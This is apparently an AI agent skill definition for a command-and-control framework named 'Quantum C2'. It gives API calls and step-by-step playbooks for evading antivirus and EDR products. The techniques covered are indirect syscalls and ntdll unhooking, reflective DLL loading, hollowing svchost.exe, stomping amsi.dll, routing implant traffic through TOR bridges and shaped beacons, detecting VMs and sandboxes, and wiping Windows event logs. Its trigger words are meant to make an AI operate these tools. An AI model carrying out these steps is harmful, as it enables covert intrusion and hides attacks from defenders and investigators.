---
name: quantum-c2-stealth
description: >
  Stealth toolkit for Quantum C2. Covers syscall cloaking, reflective loading, network anonymization, and detection evasion techniques. Use when the user needs to configure stealth operations, evade EDR/AV detection, anonymize C2 traffic, or implement covert communication channels. Triggers on: "stealth", "evasion", "cloak", "hide", "reflective load", "syscall", "network anonymize", "TOR", "EDR evasion", "AV bypass", "covert channel", "anti-detection".
---

# Quantum C2 Stealth Toolkit

Configure and operate stealth capabilities for covert C2 operations. Covers syscall cloaking, reflective loading, network anonymization, and detection evasion.

## Overview

Stealth operations in Quantum C2 operate at multiple layers:
- **Process Layer** — Syscall cloaking, reflective loading, memory-only execution
- **Network Layer** — TOR anonymization, protocol tunneling, traffic shaping
- **Behavioral Layer** — Timing control, environment checks, anti-analysis
- **File Layer** — Fileless execution, living-off-the-land, artifact cleanup

## Syscall Cloaking

### Concept
Intercept and redirect system calls to hide process activity from EDR hooks. Uses indirect syscalls and unhooked ntdll copies to bypass user-mode API monitoring.

### Configuration
```bash
# Enable syscall cloaking for a session
curl -X POST http://localhost:8000/api/sessions/{id}/stealth/cloak \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "mode": "indirect_syscalls",
    "target_functions": ["NtCreateFile", "NtReadFile", "NtWriteFile", "NtQuerySystemInformation"],
    "unhook_ntdll": true
  }'
```

### Cloaking Modes

| Mode | Description | Detection Risk |
|------|-------------|----------------|
| `indirect_syscalls` | Use syscall numbers directly, bypass API hooks | Low |
| `unhook_ntdll` | Load clean ntdll.dll copy, replace hooked functions | Medium |
| `heaven_gate` | 32-bit wow64 gateway for 64-bit syscalls | Low |
| `full_cloak` | Combine all techniques | Lowest |

### Implementation Pattern
```python
# Syscall cloaking workflow
1. Enumerate current ntdll.dll hooks
2. Load clean ntdll.dll from disk (unmapped copy)
3. Extract syscall numbers for target functions
4. Replace hooked API calls with direct syscalls
5. Verify cloaking via self-test
```

### Verification
```bash
# Check cloaking status
curl -H "Authorization: Bearer $TOKEN" http://localhost:8000/api/sessions/{id}/stealth/status

# Response includes:
{
  "cloaking_active": true,
  "mode": "indirect_syscalls",
  "hooked_functions_detected": 12,
  "cloaked_functions": 4,
  "last_check": "2026-08-17T10:30:00Z"
}
```

## Reflective Loading

### Concept
Load DLLs or executables directly into memory without touching disk. Bypasses file-based AV scanning and reduces forensic artifacts.

### Supported Loaders

| Loader Type | Target | Use Case |
|-------------|--------|----------|
| `reflective_dll` | DLL files | Load DLL from memory buffer |
| `shellcode_execute` | Raw shellcode | Execute position-independent code |
| `process_hollow` | PE executable | Hollow target process, inject payload |
| `module_stomping` | Legitimate DLL | Replace legitimate module code |
| `srdi` | DLL | Shellcode-reflective DLL injection |

### Reflective DLL Loading
```bash
# Upload and reflectively load a DLL
curl -X POST http://localhost:8000/api/sessions/{id}/stealth/reflective-load \
  -H "Authorization: Bearer $TOKEN" \
  -F "dll=@payload.dll" \
  -F "loader_type=reflective_dll" \
  -F "entry_point=DllMain" \
  -F "args=optional_args"
```

### Process Hollowing
```bash
# Hollow a legitimate process and inject payload
curl -X POST http://localhost:8000/api/sessions/{id}/stealth/process-hollow \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "target_process": "C:\\Windows\\System32\\svchost.exe",
    "payload": "<base64_encoded_shellcode>",
    "create_suspended": true,
    "hide_window": true
  }'
```

### Module Stomping
```bash
# Stomp a legitimate module with custom code
curl -X POST http://localhost:8000/api/sessions/{id}/stealth/module-stomp \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "target_module": "amsi.dll",
    "replacement": "<base64_encoded_payload>",
    "preserve_exports": true
  }'
```

## Network Anonymization

### TOR Bridge Management

Managed via the `tor_bridge.py` module. Supports multiple transport protocols.

#### Bridge Transports

| Transport | Description | Censorship Resistance |
|-----------|-------------|----------------------|
| `obfs4` | Obfuscated protocol v4 | High |
| `snowflake` | WebRTC-based proxy | Very High |
| `meq` | Custom obfuscation | Medium |
| `webtunnel` | HTTPS-wrapped tunnel | High |
| `direct` | Direct TOR (no bridge) | Low |

#### Register Client to TOR Bridge
```bash
curl -X POST http://localhost:8000/api/infrastructure/tor/register \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "client_id": "implant-001",
    "preferred_transport": "obfs4",
    "exclude_bridges": ["bridge-abc123"]
  }'
```

#### Rotate Bridge Assignment
```bash
curl -X POST http://localhost:8000/api/infrastructure/tor/rotate \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"client_id": "implant-001"}'
```

#### Check Bridge Pool Status
```bash
curl -H "Authorization: Bearer $TOKEN" http://localhost:8000/api/infrastructure/tor/bridges

# Response:
{
  "total_bridges": 11,
  "status_distribution": {"active": 9, "degraded": 2},
  "transport_distribution": {"obfs4": 5, "snowflake": 3, "webtunnel": 3},
  "active_clients": 4
}
```

#### Add Custom Bridge
```bash
curl -X POST http://localhost:8000/api/infrastructure/tor/bridges \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "address": "bridge.example.com",
    "port": 443,
    "transport": "obfs4",
    "fingerprint": "<bridge_fingerprint>"
  }'
```

### Protocol Tunneling

| Tunnel Type | Protocol | Stealth Level | Bandwidth |
|-------------|----------|---------------|-----------|
| DNS | DNS queries/responses | High | Low |
| ICMP | Echo request/reply | Medium | Low |
| HTTPS | TLS-wrapped C2 | High | High |
| WebSocket | WS/WSS frames | Medium | Medium |
| QUIC | UDP-based HTTP/3 | Very High | High |
| SOCKS Chain | Multi-proxy relay | High | Medium |

### Traffic Shaping

```bash
# Configure traffic shaping for a session
curl -X POST http://localhost:8000/api/sessions/{id}/stealth/traffic-shaping \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "beacon_interval_seconds": 60,
    "jitter_percent": 30,
    "sleep_cycles": [60, 300, 900, 3600],
    "max_data_per_beacon_bytes": 4096,
    "mimic_protocol": "https",
    "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
  }'
```

## Detection Evasion

### Environment Checks

| Check | Purpose | Action on Detection |
|-------|---------|-------------------|
| VM detection | Detect virtual machines | Sleep or exit |
| Debugger detection | Detect attached debuggers | Terminate or fake output |
| Sandbox detection | Detect analysis sandboxes | Delay execution, benign behavior |
| AV process check | Detect AV processes running | Activate evasion mode |
| Network analysis | Detect packet inspection | Switch to encrypted tunnel |

### Evasion Techniques

| Technique | Category | Description |
|-----------|----------|-------------|
| Polymorphic code | Code transformation | Mutate payload signature each execution |
| Metamorphic code | Code transformation | Rewrite code structure, same behavior |
| Encoding/obfuscation | Code transformation | Encode payload, decode at runtime |
| Memory-only execution | Execution | No disk artifacts, all in RAM |
| Fileless execution | Execution | PowerShell/WMI living-off-the-land |
| Living-off-the-land | Execution | Use legitimate system binaries |
| Beacon jitter | Timing | Randomize beacon intervals |
| Sleep cycles | Timing | Progressive sleep on inactivity |
| Anti-dump | Anti-analysis | Prevent memory dumping |
| Hash spoofing | Anti-analysis | Spoof file hash to match legitimate files |

### Configure Evasion Profile
```bash
curl -X POST http://localhost:8000/api/sessions/{id}/stealth/evasion \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "profile": "aggressive",
    "techniques": [
      "polymorphic_code",
      "memory_only_execution",
      "beacon_jitter",
      "vm_detection",
      "sandbox_detection"
    ],
    "environment_checks": {
      "vm_detect": true,
      "debugger_detect": true,
      "sandbox_detect": true,
      "av_process_check": true
    },
    "response_on_detection": "sleep_and_retry",
    "sleep_duration_seconds": 3600
  }'
```

### Evasion Profiles

| Profile | Techniques | Use Case |
|---------|-----------|----------|
| `minimal` | Beacon jitter only | Low-risk environments |
| `standard` | Jitter + VM check + encoding | General operations |
| `aggressive` | Full suite including polymorphic | High-security targets |
| `paranoid` | Maximum evasion, slow beacons | EDR-heavy environments |

## Anti-Analysis

### Timing Control
```bash
# Configure timing-based anti-analysis
curl -X POST http://localhost:8000/api/sessions/{id}/stealth/timing \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "initial_delay_seconds": 120,
    "execution_window_minutes": 5,
    "idle_sleep_seconds": 900,
    "max_beacon_size_bytes": 2048,
    "progressive_sleep": true,
    "sleep_multiplier": 2.0
  }'
```

### Artifact Cleanup
```bash
# Clean operational artifacts from a session
curl -X POST http://localhost:8000/api/sessions/{id}/stealth/cleanup \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "clear_logs": true,
    "remove_files": true,
    "wipe_registry": true,
    "clean_prefetch": true,
    "clear_event_logs": ["Security", "System", "Application"]
  }'
```

## Operational Playbook

### 1. Pre-Deployment Stealth Check
```
1. Check target environment: POST /api/sessions/{id}/stealth/status
2. Select evasion profile based on EDR presence
3. Configure traffic shaping (beacon interval, jitter)
4. Enable environment checks (VM, debugger, sandbox)
5. Test cloaking: verify hooks are bypassed
```

### 2. Covert Channel Setup
```
1. Register client to TOR bridge with preferred transport
2. Configure protocol tunneling (DNS/HTTPS/QUIC)
3. Set traffic shaping parameters
4. Verify connectivity through anonymized channel
5. Monitor bridge health for failover readiness
```

### 3. Reflective Payload Deployment
```
1. Generate payload with reflective loader
2. Upload to session via reflective-load endpoint
3. Verify in-memory execution (no disk artifacts)
4. Confirm C2 callback through anonymized channel
5. Activate evasion profile
```

### 4. EDR Evasion Sequence
```
1. Run environment checks to identify EDR processes
2. Activate syscall cloaking (indirect_syscalls mode)
3. Load clean ntdll.dll copy (unhook_ntdll)
4. Apply polymorphic encoding to payload
5. Execute via memory-only loader
6. Verify no file artifacts created
```

## References
- `quantum-c2-infra` — TOR bridge and packet dispersal infrastructure
- `quantum-c2-deception` — Deception and event-triggered evasion
- `backend/app/modules/c2_infrastructure/tor_bridge.py` — TOR bridge manager
- `backend/app/modules/c2_infrastructure/packet_dispersal.py` — Protocol dispersal engine
